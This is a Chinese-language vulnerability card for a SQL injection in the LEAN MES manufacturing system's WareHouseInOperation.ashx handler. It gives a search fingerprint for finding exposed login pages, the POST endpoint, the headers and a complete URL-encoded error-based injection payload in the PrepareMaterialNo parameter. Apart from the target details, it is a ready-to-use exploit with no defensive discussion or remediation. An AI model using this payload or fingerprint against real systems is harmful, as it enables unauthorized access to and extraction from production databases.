# 深科特LEANMESWareHouseInOperation.ashxSQL注入漏洞

- **系统**：深科特LEANMESWareHouseInOperation.ashx　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="LEAN MES - 用户登录"`
- **请求**：`POST /Handler/WareHouseInOperation.ashx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`

**请求体 / payload**
```
api=GetPrepareMaterial&GetType=&PrepareMaterialNo=-1%27+AND+9252+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289252%3D9252%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--+HnSR
```
- **预期**：200　|　—